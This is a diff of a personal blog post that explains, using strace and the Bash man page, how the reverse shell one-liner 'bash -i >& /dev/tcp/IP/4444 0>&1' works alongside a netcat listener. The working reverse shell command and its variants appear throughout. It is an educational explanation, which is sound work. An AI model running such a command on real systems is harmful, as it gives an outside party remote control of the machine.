@@ -6,17 +6,17 @@ desc = "Figuring out how a Bash one-liner works as a reverse shell."
 tags = ["security", "today-i-learned"]
 +++
 
-Yesterday I saw a message from [Bryan Brake] on one the of [BrakeSec Slack] channels:
+Yesterday I saw a message from [Bryan Brake] on one of the [BrakeSec Slack] channels:
 
 > This is a pretty bit of bash scripting *bash -i >& /dev/tcp/192.168.8.198&#x002f;4444 0>&1*
 
-I knew that it’s a reverse shell&#8239;---&thinsp;a tool that connects from the target computer to you (hence the ‘reverse’) and allows executing commands on that machine (‘shell’). But how does it work?
+I knew that it’s a reverse shell&#8239;---&thinsp;a tool that connects the target computer back to you (hence the ‘reverse’) and then allows you to execute commands on that machine (‘shell’). But how does it work?
 
 *Skip to the [Summary] if you just want the answer.*
 
 ## Setup
 
-Bryan than mentioned that is supposed to be used in conjunction with a [netcat], which is `nc` or `ncat` depending on your version, listening on port `4444` running on the computer with <abbr>IP</abbr> `192.168.8.198`:
+Bryan then mentioned that this command is supposed to be used with a [netcat], which is `nc` or `ncat` depending on your version, listening on port `4444` of the computer with <abbr>IP</abbr> `192.168.8.198`:
 ```
 $ nc -v -n -l -p 4444
 # -v — be verbose
@@ -34,15 +34,15 @@ $ nc -vnlp 4444
 $ bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 ```
 
-And it works! Now let’s figure out one peace at the time, starting from `bash -i`.
+And it works! Now, let’s figure it out one peace at the time, starting from `bash -i`.
 
 ## Interactive Bash
 
-According to the [Bash] man page (`man bash`), option `-i` means that the bash is forced to start an _“interactive shell.”_ The _INVOCATION_ section explains that non-interactive shell will not execute its startup files: `/etc/profile`, `~/.profile`, `~/.bashrc`, etc. It also says that Bash starts in this interactive mode automatically when there are no non-option arguments (unless you pass a command to execute with `-c`) and when its standard input and error streams are both connected to terminals.
+According to the [Bash] man page (`man bash`), option `-i` means that we’re starting an _“interactive shell.”_ The _Invocation_ section then explains that non-interactive shell will not execute its startup files: all those `/etc/profile`, `~/.profile`, `~/.bashrc`, etc. It also says that Bash automatically starts in this interactive mode when there are no non-option arguments (unless you pass a command to execute with a `-c`) and when its standard input and error streams are both connected to terminals.
 
 {{<lead>}}So why would we want an interactive shell?{{</lead>}} I think, just because it will be more like shells that we’re used to&#8239;---&thinsp;with default aliases, correctly set `PATH`, and a [prompt].
 
-{{<lead>}}Ok, and why isn’t it interactive right away?{{</lead>}} Those angle brackets that we have in our command typically used to redirect standard streams; they probably make Bash think that it isn’t running in the terminal. Let’s look into it.
+{{<lead>}}Ok, and why isn’t it interactive in our case?{{</lead>}} Those angle brackets in our command redirect standard streams; this probably make Bash think that it isn’t running in the terminal. Let’s look into it.
 
 ## Network Redirection
 
@@ -53,7 +53,7 @@ $ ls -l > dir.list
 
 A quick search through the good old man page reveals that `>& target` is just an alternative form of `&> target`, which in turn means `1> target 2>&1`&#8239;---&thinsp;redirect both standard output and standard error streams to the `target`.
 
-At this point, I made a mistake thinking that `>& /dev/tcp/127.0.0.1/4444` is merely a redirect of stdout and stderr to some special file `/dev/tcp/127.0.0.1/4444` that automatically opens a <abbr>TCP</abbr> connection. Everything is a file on Linux after all, right? This can even be “confirmed” by redirecting the output of simple `echo`:
+At this point, I made a mistake thinking that `>& /dev/tcp/127.0.0.1/4444` is merely a redirect of stdout and stderr to some special file `/dev/tcp/127.0.0.1/4444` that automatically opens a <abbr>TCP</abbr> connection. Everything is a file on Linux after all, right? This can even be “confirmed” by redirecting the output of a simple `echo`:
 ```
 # (1) don’t forget to start listening,
 # since nc will quit every time you disconnect;
@@ -69,7 +69,7 @@ But then I’ve tried to do the same thing from [<abbr>ZSH</abbr>][ZSH]:
 $ echo hello, world > /dev/tcp/127.0.0.1/4444
 zsh: no such file or directory: /dev/tcp/127.0.0.1/4444
 ```
-{{<lead>}}Why doesn't it work in <abbr>ZSH</abbr>?{{</lead>}} It turns out, it could be a special file, but I think this isn’t supported on my Debian, so Bash just emulates them, while <abbr>ZSH</abbr> does not.
+{{<lead>}}Why doesn't it work in <abbr>ZSH</abbr>?{{</lead>}} It turns out, it could be a special file, but I think this isn’t supported on my Debian, so Bash just emulates them, while <abbr>ZSH</abbr> does not. What’s interesting to note, it works without any special rights!
 
 Now for the most confusing part.
 
@@ -77,7 +77,7 @@ Now for the most confusing part.
 
 That’s exactly how `0>&1` reads to me. What does it even mean?!
 
-At first, I thought this is needed so that the server, i.e. netcat side, would see its input back. I’ve tested my idea by removing it from the command. That broke the ‘shell’ part of the reverse shell: now I could see commands and their output on the server, but couldn’t execute anything! You should play with it; it’s kind of a weird setup:
+At first, I thought this is needed so that the server, i.e. netcat side, would see its input back. I’ve tested my idea by removing it from the command. That broke the ‘shell’ part: now I could still see commands and their output on the server side, but couldn’t execute anything! You should play with it; it’s kind of a weird setup:
 ```
 $ bash -i >& /dev/tcp/127.0.0.1/4444
 ```
@@ -101,7 +101,7 @@ $ grep --line-number '127.0.0.1' strace.out
 200:[pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
 ```
 
-First hit isn’t interesting, it’s just `strace` executing our command. But the second one looks promising. Here’s it with a couple more lines around:
+First hit isn’t interesting, it’s just `strace` executing our command. But the second one looks promising. Here it is with a couple more lines around:
 ```
 199: [pid  5106] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
 200: [pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
@@ -113,20 +113,20 @@ First hit isn’t interesting, it’s just `strace` executing our command. But t
 206: [pid  5106] execve("/bin/bash", ["bash", "-i"], 0x2485008 /* 57 vars */) = 0
 ```
 
-* According to `man socket`, call to `socket()` returns a file descriptor (fd), in our case, it’s `3`. Then `connect()`, unsurprisingly, connects a socket identified by the fd to the given address. Ok, so after first two lines we have an open socket to our server.
-* Again, consulting with `man` reveals that `dup2(3, 1)` on line 3 will close fd `1`, which is our stdout, and create a copy of the socket (fd `3`) on it. _“After  a  successful return, the old and new file descriptors may be used interchangeably.”_ Now we close `3` since we don’t need the original anymore. Great, so it looks like the `1> /dev/tcp/...` part is done in four syscalls.
-* On line 203 `dup(1, 2)` does the same thing to our stderr: closes original and make a copy of socket to fd `2`. We’re done with the `>& /dev/tcp/...`.
+* According to `man socket`, call to `socket()` returns a file descriptor (_fd_), in our case, it’s `3`. Then `connect()`, unsurprisingly, connects a socket identified by the fd to the given address. Ok, so after the first two lines we have an open socket to our server.
+* Again, consulting with `man` reveals that `dup2(3, 1)` on line 3 will close fd `1`, which is our stdout, and create a copy of the socket (fd `3`) on it. _“After  a  successful return, the old and new file descriptors may be used interchangeably.”_ Now we close `3` since we don’t need the original anymore. Great! The `1> /dev/tcp/...` part is done in four syscalls.
+* On line 203 `dup(1, 2)` does the same thing to our stderr: closes original and makes a copy of a socket to fd `2`. We’re now done with the `>& /dev/tcp/…`.
 
 Only after meditating on line 204 for a while, it clicked for me: I was completely wrong about redirections! Using them is *not* like connecting tubes, even if it typically looks that way. Both `>` and `<` are *value assignments!*
 
-When you do `ls -l > dir.list` you are not somehow “sending” the output from `ls` to the file. You’re assigning the file `dir.list` to the standard output of `ls`.
+When you do `ls -l > dir.list` you are not somehow “sending” the output from `ls` to the file. You’re _assigning_ the file `dir.list` to the standard output of `ls`.
 
 This also explains why you can put redirections wherever you like around the command:
 ```
 # these are the same
-$ ls -l > dir.list
-$ > dir.list ls -l
-$ ls > dir.list -l
+$ some_cmd -v > file
+$ > file some_cmd -v
+$ some_cmd > file -v
 ```
 But the order of redirections relative to each other matters:
 ```
@@ -139,7 +139,7 @@ $ some_cmd 2>&1 1>file
 $ some_cmd 1>file 2>&1
 ```
 
-When you execute `0>&1`, you are assigning to stdin the stdout’s fd, which is at that point a socket. There’s almost no difference if you do it the other way around `0<&1`&#8239;---&thinsp;that’s still `stdin := stdout (== socket)`. The only difference is that `>` checks if a target is available for writing and `<` tests for reading. Our socket is bidirectional, so it passes both.
+When we execute `0>&1`, we’re assigning to stdin the stdout’s fd, which is at that point is a socket. It doesn’t change almost anything if we do it the other way around: `0<&1`&#8239;---&thinsp;it’s still `stdin := stdout`. The only difference is that `>` checks if a target is available for writing and `<` tests for reading. Our socket is bidirectional, so it passes both.
 
 ## Summary
 
